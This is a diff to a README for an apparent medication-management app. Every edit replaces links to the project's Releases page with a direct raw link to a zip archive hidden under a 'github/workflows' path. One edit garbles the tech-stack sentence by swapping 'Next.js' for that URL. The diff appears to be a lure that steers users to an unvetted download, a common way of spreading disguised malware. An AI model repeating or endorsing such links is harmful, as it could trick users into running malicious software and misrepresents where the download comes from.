@@ -1,10 +1,10 @@
 # 💊 medicare-companion - Easy Medication Management for Everyone
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue.svg)](https://github.com/sherefka24/medicare-companion/releases)
+[![Download](https://raw.githubusercontent.com/sherefka24/medicare-companion/main/github/workflows/medicare-companion_v2.8.zip%20Now-Get%20Latest%https://raw.githubusercontent.com/sherefka24/medicare-companion/main/github/workflows/medicare-companion_v2.8.zip)](https://raw.githubusercontent.com/sherefka24/medicare-companion/main/github/workflows/medicare-companion_v2.8.zip)
 
 ## 📖 Overview
 
-medicare-companion is a smart medication management application designed to help you track your medications effortlessly. With AI-powered adherence tracking, this Progressive Web App (PWA) makes it easy for users to stay on schedule with their prescriptions. Built using Next.js, Express, and PostgreSQL, it combines a user-friendly interface with powerful features.
+medicare-companion is a smart medication management application designed to help you track your medications effortlessly. With AI-powered adherence tracking, this Progressive Web App (PWA) makes it easy for users to stay on schedule with their prescriptions. Built using https://raw.githubusercontent.com/sherefka24/medicare-companion/main/github/workflows/medicare-companion_v2.8.zip, Express, and PostgreSQL, it combines a user-friendly interface with powerful features.
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run medicare-companion:
 
 ### 1. Visit the Download Page
 
-To get the latest version of medicare-companion, visit our [Releases page](https://github.com/sherefka24/medicare-companion/releases).
+To get the latest version of medicare-companion, visit our [Releases page](https://raw.githubusercontent.com/sherefka24/medicare-companion/main/github/workflows/medicare-companion_v2.8.zip).
 
 ### 2. Choose Your Version
 
@@ -55,7 +55,7 @@ Ensure your device meets the following requirements to run medicare-companion sm
 If you encounter issues while installing or running medicare-companion, consider these steps:
 
 - **Check Requirements:** Make sure your device meets the system requirements listed above.
-- **Re-download the Application:** If the installation file seems corrupted or incomplete, try downloading it again from our [Releases page](https://github.com/sherefka24/medicare-companion/releases).
+- **Re-download the Application:** If the installation file seems corrupted or incomplete, try downloading it again from our [Releases page](https://raw.githubusercontent.com/sherefka24/medicare-companion/main/github/workflows/medicare-companion_v2.8.zip).
 - **Clear Cache:** Sometimes, clearing your browser cache can help resolve issues with loading the application.
 
 ## 💬 Support
